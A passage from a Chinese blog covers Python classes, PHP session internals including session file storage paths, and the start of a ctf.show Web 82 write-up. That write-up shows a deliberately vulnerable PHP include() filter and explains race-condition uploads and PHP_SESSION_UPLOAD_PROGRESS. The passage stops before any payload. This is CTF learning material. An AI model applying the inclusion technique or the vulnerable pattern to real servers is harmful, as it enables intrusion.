<p>可以理解为，因为许多对象都有共同点，可以根据共同点对它们分类，所以有了“类”。不过，实践中往往是定义好类后，才以定义好的类为标准，“创造”出许多同一类的对象。这些被“创造”出来的对象，称为实例。用定义好的类“创造”对象的过程，称为实例化。</p>
<h2 id="属性与方法，实例化"><a href="#属性与方法，实例化" class="headerlink" title="属性与方法，实例化"></a>属性与方法，实例化</h2><p>在类中可以定义属性和方法。如上面的代码段在类 <code>Dog</code> 中定义了属性 <code>species</code> 和方法 <code>whatspecies</code>、 <code>__init__</code> 、<code>sit</code> 等。</p>
<p>要调用某个类的属性和方法，可以直接通过 <code>类名.属性/方法</code> 这样的方式，也可以通过实例化。</p>
<p><strong>类名.属性&#x2F;方法</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(Dog().species) <span class="comment"># 共输出2次“犬科动物”</span></span><br><span class="line"><span class="built_in">print</span>(Dog().whatspecies()) <span class="comment"># 即使定义时省略了括号，Dog()在此处也不能省略括号，否则不会被当成类名</span></span><br></pre></td></tr></table></figure>

<p><strong>实例化</strong>：<br>实例化是指用定义好的类“创造”对象，让不同的对象（实例）来自同一类，共享类中的属性与方法。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog2 = Dog()</span><br><span class="line"><span class="built_in">print</span>(dog1.species)</span><br><span class="line"><span class="built_in">print</span>(dog1.whatspecies())</span><br><span class="line"><span class="built_in">print</span>(dog2.species)</span><br><span class="line"><span class="built_in">print</span>(dog2.whatspecies()) <span class="comment"># 共输出4次“犬科动物”</span></span><br></pre></td></tr></table></figure>

<p>另外，属性的定义与变量的定义一致，不过要调用时需要<code>类名.属性</code>或实例化的方式；但方法与函数的定义有一点不同：<strong>必须有一个额外的第一个参数名称, 按照惯例它的名称是 self</strong> （后面会细讲）。</p>
<h2 id="init-方法"><a href="#init-方法" class="headerlink" title="__init__ 方法"></a><code>__init__</code> 方法</h2><p>上面的实例化是直接进行实例化，也可以通过 <code>__init__()</code> 方法实例化类。如上面案例中的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>:</span><br><span class="line">    <span class="comment"># 构造函数：创建小狗时必须提供名字和年龄</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name  <span class="comment"># 小狗的名字（属性）</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age    <span class="comment"># 小狗的年龄（属性）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方法：小狗坐下</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 乖乖坐下了！&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong>：在创建一个类的实例（对象）时，<code>__init__</code> 方法会被<strong>自动调用</strong>，用于为对象设置初始属性。</p>
<p>对比一下有无 <code>__init__</code> 方法的两种情况：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog(<span class="string">&quot;大黄&quot;</span>, <span class="number">10</span>)  <span class="comment"># 创建对象时直接传入属性值</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dog1 = Dog()</span><br><span class="line">dog1.name = <span class="string">&quot;大黄&quot;</span>  <span class="comment"># 手动添加属性</span></span><br><span class="line">dog1.age = <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>上面的 <code>Dog(&quot;大黄&quot;, 10)</code> 分别传参给 <code>name </code>与 <code>age</code> 两个属性，再在 <code>__init__</code> 方法中成为实例 <code>dog1</code> 的实例属性（ <code>self</code> 表示实例本身）。</p>
<p><strong>关于实例属性与类属性</strong>：类属性可被所有属于该类的对象调用（类似 <code>dog1.species</code> ，所有该类实例的 <code>species</code> 属性都是“犬科动物”），实例属性则只能通过该实例调用（<code>dog1.name</code>）。</p>
<p><strong>关于 <code>self</code></strong><br><code>self</code> 代表类的实例，而非类本身。类的方法相比普通函数只有一个特别的区别：它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 <code>self</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.__class__)</span><br><span class="line"></span><br><span class="line">t = Test()</span><br><span class="line">t.prt()</span><br></pre></td></tr></table></figure>

<p>以上实例执行结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;__main__.Test instance at 0x100771878&gt;</span><br><span class="line">__main__.Test</span><br></pre></td></tr></table></figure>

<p>从执行结果可以很明显的看出，<code>self</code> 代表的是类的实例，<strong>代表当前对象的地址</strong>，而 <code>self.class</code> 则指向类。<br> 由于 <code>self</code> 并非关键字，所以可以将 <code>self</code> 替换成其他的关键字，也不会出现问题。<br>在 Python中，<code>self</code> 是一个惯用的名称，用于表示类的实例（对象）自身。它是一个指向实例的引用，使得类的方法能够访问和操作实例的属性。<br>当你定义一个类，并在类中定义方法时，第一个参数通常被命名为 <code>self</code>，尽管你可以使用其他名称，但强烈建议使用 <code>self</code>，以保持代码的一致性和可读性</p>
<h2 id="核心概念解析"><a href="#核心概念解析" class="headerlink" title="核心概念解析"></a>核心概念解析</h2><ol>
<li><p><strong>封装</strong>：把数据（属性）和操作（方法）打包在一起</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">my_dog.age += <span class="number">1</span>  <span class="comment"># 直接修改属性</span></span><br><span class="line">my_dog.sit()  <span class="comment"># 调用方法</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>继承</strong>：子类继承父类的特性（比如导盲犬是特殊的小狗）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GuideDog</span>(<span class="title class_ inherited__">Dog</span>):  <span class="comment"># 继承自Dog类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">guide</span>(<span class="params">self</span>):</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> 正在引导主人！&quot;</span>)</span><br><span class="line"></span><br><span class="line">guide_dog = GuideDog(<span class="string">&quot;大黄&quot;</span>, <span class="number">4</span>)</span><br><span class="line">guide_dog.sit()      <span class="comment"># 继承父类方法</span></span><br><span class="line">guide_dog.guide()    <span class="comment"># 子类新增方法</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>多态</strong>：不同对象对同一方法有不同的响应（比如猫狗的叫法不同）</p>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/" data-id="cma21qgo1000bxwuhbv4ibb5q" data-title="Python-面向对象入门" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/" rel="tag">面向对象</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Session" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/20/Session/" class="article-date">
  <time class="dt-published" datetime="2025-04-20T12:55:59.000Z" itemprop="datePublished">2025-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/20/Session/">Session</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="HTTP-无状态性的核心问题"><a href="#HTTP-无状态性的核心问题" class="headerlink" title="HTTP 无状态性的核心问题"></a>HTTP 无状态性的核心问题</h2><p>HTTP 协议本身 <strong>不会记住用户上一次的请求</strong>，每个请求都是独立的。例如：</p>
<ul>
<li><strong>问题</strong>：用户登录后，跳转到其他页面时，服务器无法自动识别这是同一个用户。</li>
<li><strong>Cookie 的局限性</strong>：虽然 Cookie 可以存储用户信息，但直接存储敏感数据在客户端（如用户ID）存在安全隐患，且可能被篡改。</li>
<li><strong>解决方案</strong>：开发者提出将敏感数据存储在<strong>服务器端</strong>，客户端仅保存一个随机生成的 ID（Session ID），通过这个 ID 关联服务器数据，解决了安全性和状态管理问题。</li>
</ul>
<h2 id="Session工作原理流程"><a href="#Session工作原理流程" class="headerlink" title="Session工作原理流程"></a>Session工作原理流程</h2><ul>
<li>客户端访问网站</li>
<li>服务器创建 SessionID </li>
<li>通过 Cookie 发送给浏览器（ Set-Cookie 字段）</li>
<li>浏览器后续请求携带 SessionID </li>
<li>服务器匹配 Session 数据</li>
<li>读取&#x2F;修改数据</li>
</ul>
<h3 id="流程解析（以-PHP-为例）"><a href="#流程解析（以-PHP-为例）" class="headerlink" title="流程解析（以 PHP 为例）"></a>流程解析（以 PHP 为例）</h3><p><strong>用户首次访问</strong></p>
<ol>
<li><strong>请求到达服务器</strong>：用户访问网站（如 <code>example.com</code>）。</li>
<li><strong>生成 Session ID</strong>：服务器检查请求中是否携带 Session ID。如果是新用户，服务器生成一个 <strong>唯一 Session ID</strong>（如 <code>abc123</code>），通常通过加密算法（如 PHP 默认使用 <code>sha1</code>）生成。</li>
<li><strong>创建存储文件</strong>：服务器在指定目录（如 <code>/tmp/</code>）生成文件 <code>sess_abc123</code>（注意该文件无后缀名），用于存储该用户的 Session 数据（如用户名、购物车内容等）。</li>
<li><strong>返回 Session ID</strong>：服务器通过 <strong>HTTP 响应头</strong> 将 Session ID 传递给浏览器。默认使用 <strong>Cookie</strong>（如 <code>PHPSESSID=abc123</code>），但也可通过 URL 参数传递（不推荐）。</li>
</ol>
<p><strong>用户后续请求</strong></p>
<ol>
<li><strong>携带 Session ID</strong>：浏览器在后续请求中自动通过 Cookie 发送 Session ID （<code>PHPSESSID=abc123</code>）。</li>
<li><strong>服务器读取数据</strong>：服务器收到请求后，通过 Session ID 找到对应的文件 <code>sess_abc123</code>，并将文件内容反序列化为 <code>$_SESSION</code> 数组。<br>注：<strong>序列化 (Serialization)<strong>：把程序中的</strong>对象</strong>（如变量、数据结构）转换为<strong>标准化格式</strong>（字符串&#x2F;二进制流）；<strong>反序列化 (Deserialization)<strong>：将</strong>标准化格式</strong>的数据重新转换为程序可用的<strong>原始对象</strong>，恢复其结构和功能。</li>
<li><strong>数据更新与保存</strong>：PHP 脚本执行过程中修改 <code>$_SESSION</code> 的数据，脚本结束时，服务器将 <code>$_SESSION</code> 的数据序列化后写回文件。</li>
</ol>
<h2 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h2><p><strong>Session 的创建</strong></p>
<p>Session 的创建和管理是由<strong>后端编程语言或框架</strong>（应用服务器）实现，如：</p>
<ul>
<li><strong>Tomcat</strong>：Java Servlet 容器，运行 Java Web 应用。</li>
<li><strong>uWSGI</strong>：Python 应用服务器，配合 Django&#x2F;Flask 使用。</li>
<li><strong>Node.js</strong>：本身不是应用服务器，但 Express、Koa 等框架提供类似功能。</li>
<li><strong>PHP-FPM</strong>：专为 PHP 设计的进程管理器，与 Nginx&#x2F;Apache 配合使用。</li>
</ul>
<p><strong>服务器端数据存储</strong></p>
<ul>
<li><strong>默认存储方式</strong>：文件存储（每个 Session ID 对应一个文件，如 <code>sess_abc123</code>）。</li>
<li><strong>存储路径</strong>：通过 <code>php.ini</code> 的 <code>session.save_path</code> 配置（如 <code>/tmp/</code>）。</li>
<li><strong>序列化格式</strong>：数据以键值对形式序列化存储（如 <code>username|s:4:&quot;Lucy&quot;;</code>）。</li>
<li><strong>其他存储方式</strong>：可自定义存储到数据库、Redis 等。</li>
</ul>
<p><strong>Session 的生命周期</strong></p>
<p>Session 数据在会话期间（持续操作 Session 时）持续有效，也可通过 <code>session_destroy()</code> 或配置的过期时间（ <code>php.ini</code> 中的 <code>session.gc_maxlifetime</code> 配置项）自动清理。若用户在一定时间内没有对服务器进行任何与该 Session 相关的操作（如关闭浏览器），服务器就会认为会话已结束，从而使 Session 失效。<br>有些应用可能会采用持久化 Session 的方式，将 Session 数据存储在数据库或其他持久化存储介质中。这样即使关闭浏览器，下次打开浏览器访问该网站时，只要在一定的有效期内，仍然可以恢复之前的 Session 状态。（“记住我”功能）</p>
<h2 id="PHP-中的-Session"><a href="#PHP-中的-Session" class="headerlink" title="PHP 中的 Session"></a>PHP 中的 Session</h2><h3 id="SESSION-数组"><a href="#SESSION-数组" class="headerlink" title="$_SESSION 数组"></a><code>$_SESSION</code> 数组</h3><p>与其他超全局变量（如 <code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code>）不同，<code>$_SESSION</code> 的内容并非直接来自客户端的输入，而是存储在<strong>服务器端</strong>。</p>
<p>当用户首次访问时，PHP 会生成一个唯一的 <code>Session ID</code>，并发送到客户端。后续请求中，客户端携带 <code>Session ID</code>（如通过 Cookie 或 URL），服务器根据该 ID 找到对应的 Session 数据并加载到 <code>$_SESSION</code> 数组中。</p>
<h3 id="Session-工作流程"><a href="#Session-工作流程" class="headerlink" title="Session 工作流程"></a>Session 工作流程</h3><p><strong>初始化会话</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启会话，读取或创建 Session ID</span></span><br></pre></td></tr></table></figure>

<p>当调用 <code>session_start()</code> 时，PHP 会执行以下操作：</p>
<ul>
<li><strong>检查客户端是否携带有效的 Session ID</strong>：<ul>
<li>如果客户端通过 Cookie 或 URL 传递了有效的 Session ID（ Cookie 中默认为 <code>PHPSESSID</code>），PHP 会尝试读取对应的 Session 文件。</li>
<li>如果未找到有效的 Session ID，PHP 会生成一个新的 Session ID，并创建一个新的 Session 文件（通常为空文件，路径由 <code>session.save_path</code> 配置决定）。新的 Session ID 会通过 HTTP 响应头（ Cookie 或 URL ）将 Session ID 传递给浏览器。</li>
</ul>
</li>
<li>**加载数据到 <code>$_SESSION</code>**：<ul>
<li>如果 Session 文件中有数据，PHP 会将其反序列化并加载到 <code>$_SESSION</code> 数组中。</li>
<li>如果是一个新会话，<code>$_SESSION</code> 数组初始化为空。</li>
</ul>
</li>
</ul>
<p><strong>操作 Session 数据</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;Alice&#x27;</span>; <span class="comment">// 写入数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];      <span class="comment">// 读取数据</span></span><br></pre></td></tr></table></figure>

<ul>
<li>**修改 <code>$_SESSION</code>**：<ul>
<li>开发者可以在脚本中直接操作 <code>$_SESSION</code> 数组（如 <code>$_SESSION[&#39;key&#39;] = &#39;value&#39;</code>）。</li>
<li>此时所有修改仅保存在内存中的 <code>$_SESSION</code> 数组里，<strong>尚未写入 Session 文件</strong>。</li>
</ul>
</li>
<li><strong>自动提交</strong>：<ul>
<li>PHP 会在脚本执行结束时（或调用 <code>session_write_close()</code> 时），将 <code>$_SESSION</code> 数组的内容序列化，并写入到 Session 文件中。（默认情况下，Session 文件会被加锁。如果脚本执行时间过长，其他请求访问同一 Session 会被阻塞。可通过 <code>session_write_close()</code> 提前释放锁。）</li>
<li>写入完成后，Session 文件会更新为最新的数据。</li>
</ul>
</li>
</ul>
<p>**销毁 Session **</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_destroy</span>(); <span class="comment">// 删除服务器端 Session 数据</span></span><br></pre></td></tr></table></figure>

<p>可通过 <code>session_destroy()</code> 或配置的过期时间（ <code>session.gc_maxlifetime</code> 配置项）来销毁 Session 。</p>
<p><strong>PHP Session 文件的储存路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>



<h3 id="Session-的常用配置项"><a href="#Session-的常用配置项" class="headerlink" title="Session 的常用配置项"></a>Session 的常用配置项</h3><ul>
<li><code>session.save_path</code>：Session文件存储路径（默认 <code>/tmp</code>）。</li>
<li><code>session.name</code>：Session Cookie的名称（默认 <code>PHPSESSID</code>）。</li>
<li><code>session.cookie_lifetime</code>：Session ID的存活时间（秒，0表示浏览器关闭后失效）。</li>
<li><code>session.gc_maxlifetime</code>：Session数据过期时间（默认1440秒，24分钟）。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/20/Session/" data-id="cma21qgo2000cxwuhc7ff28z5" data-title="Session" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-条件竞争漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2025-04-19T10:35:19.000Z" itemprop="datePublished">2025-04-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/19/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/">条件竞争漏洞与 Session 的文件上传进度追踪功能</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ctf.show Web 82</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一道漫长的题目，在解题之前，我们先了解一些东西：</p>
<h2 id="条件竞争漏洞原理与实例"><a href="#条件竞争漏洞原理与实例" class="headerlink" title="条件竞争漏洞原理与实例"></a>条件竞争漏洞原理与实例</h2><p><strong>技术原理</strong>：在程序运行中，开发者一般希望代码按顺序一条一条执行。但在多线程或多进程的环境下，服务器会并发处理多个请求。如果没有使用合适的同步机制（像锁，它能保证同一时间只有一个线程能访问某个资源 ），这些并发的线程就可能同时操作共享资源，导致结果不可预测。比如两个线程同时读取一个变量的值，然后都对这个值进行修改再写回去，最后保存的值可能不是预期的，因为它们互相干扰了。</p>
<p><strong>以文件上传为例</strong>： 有些网站允许用户上传文件，服务器会先检查文件是否符合要求（比如只允许上传图片格式文件 ），如果不符合就删除。在检查和删除之间有个时间差，这就是 “竞争窗口” 。攻击者可以利用这个时间差，快速多次发送上传恶意文件（比如包含恶意代码的 PHP 文件 ）的请求。因为服务器在同一时刻可能处理不过来这么多请求，在还没来得及删除不符合要求的文件时，攻击者就可能成功访问到这个恶意文件并让它执行，进而在服务器上植入后门，获取对服务器的控制。<strong>类似于DDOS攻击</strong>,当请求发送得太多，服务器可能会漏掉一些恶意文件的上传请求，从而导致恶意文件被发送在服务器中造成后门漏洞。<br>（以上两段摘自<a target="_blank" rel="noopener" href="http://www.th-dedsec.top《条件竞争漏洞》2025.04.07)/">www.th-dedsec.top《条件竞争漏洞》2025.04.07）</a></p>
<h2 id="PHP-SESSION-UPLOAD-PROGRESS-是什么？"><a href="#PHP-SESSION-UPLOAD-PROGRESS-是什么？" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS 是什么？"></a><code>PHP_SESSION_UPLOAD_PROGRESS</code> 是什么？</h2><p><code>PHP_SESSION_UPLOAD_PROGRESS</code> 是 PHP 提供的一个机制，用于<strong>实时跟踪文件上传的进度</strong>。比如上传一个大文件时，你可以用它获取当前上传的百分比、速度、剩余时间等信息。</p>
<p><strong>工作原理</strong></p>
<ul>
<li>当 <code>session.upload_progress.enabled</code> 配置项开启时，PHP 脚本在运行过程中一旦检测到表单里存在 <code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code> 的字段，就会开启文件上传进度跟踪功能。</li>
<li>此时，当用户上传文件，PHP 会在<strong>会话（Session）</strong>中生成一个数组，记录该脚本里所有文件上传操作的数据（见下方演示进度信息的数组）。</li>
<li>需要通过其他方式（如 AJAX 轮询）<strong>读取这个会话数据</strong>，实时显示进度条给用户。</li>
</ul>
<p><strong>配置要求</strong></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">On</span>    <span class="comment">; 启用上传进度跟踪</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">On</span>   <span class="comment">; 上传完成后自动清理进度数据</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span>    <span class="comment">; 会成为隐藏字段的value的值在session文件中的前缀，如&#x27;upload_progress_my_upload&#x27;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>    <span class="comment">; 隐藏字段的名称</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span>    <span class="comment">; 每上传1%或1KB更新进度（可设置为百分比或字节，如 1024）</span></span><br></pre></td></tr></table></figure>

<p><strong>基本使用步骤</strong></p>
<ul>
<li><p><strong>表单设置</strong><br>在文件上传表单中，<strong>必须</strong>添加一个名为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> （具体名称由上面提到的配置项 <code>session.upload_progress.name</code> 确定）的隐藏字段：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;my_upload&quot;</span> /&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">  &lt;!-- Tips: type=<span class="string">&quot;file&quot;</span>时会自动弹出文件选择框，不需要手动设置value --&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>只有检测到表单里存在 <code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code> 的字段，才会跟踪文件上传进度并写入 Session 中。</p>
</li>
<li><p><strong>读取进度</strong><br>通过 AJAX 或其他方式，从前端定期请求一个 PHP 脚本，读取会话中的进度信息（此部分仅作了解，不作演示）。</p>
</li>
</ul>
<p><strong>Session 中的进度信息</strong></p>
<p>会话中的进度信息是一个数组，键为 <code>&#39;upload_progress_my_upload&#39;</code> （具体由 <code>session.upload_progress.prefix</code> 配置项与表单隐藏字段中的 <code>value</code> 拼接而成）包含以下关键字段：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_progress_my_upload&#x27;</span>] = [</span><br><span class="line">    <span class="string">&quot;start_time&quot;</span> =&gt; <span class="number">1234567890</span>,  <span class="comment">// 开始时间戳</span></span><br><span class="line">    <span class="string">&quot;content_length&quot;</span> =&gt; <span class="number">1024000</span>, <span class="comment">// 文件总大小（字节）</span></span><br><span class="line">    <span class="string">&quot;bytes_processed&quot;</span> =&gt; <span class="number">512000</span>, <span class="comment">// 已上传字节</span></span><br><span class="line">    <span class="string">&quot;done&quot;</span> =&gt; <span class="literal">false</span>              <span class="comment">// 是否完成</span></span><br><span class="line">    <span class="comment">// 包含每个上传文件详细信息的数组</span></span><br><span class="line">    <span class="string">&quot;files&quot;</span> =&gt; [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;example.jpg&#x27;</span>, <span class="comment">// 文件名</span></span><br><span class="line">            <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="comment">// 文件类型</span></span><br><span class="line">            <span class="string">&#x27;tmp_name&#x27;</span> =&gt; <span class="string">&#x27;/tmp/php5678&#x27;</span>, <span class="comment">// 临时文件名</span></span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="number">0</span>, <span class="comment">// 上传错误码</span></span><br><span class="line">            <span class="string">&#x27;size&#x27;</span> =&gt; <span class="number">1048576</span> <span class="comment">// 文件大小（字节）</span></span><br><span class="line">        ]</span><br><span class="line">    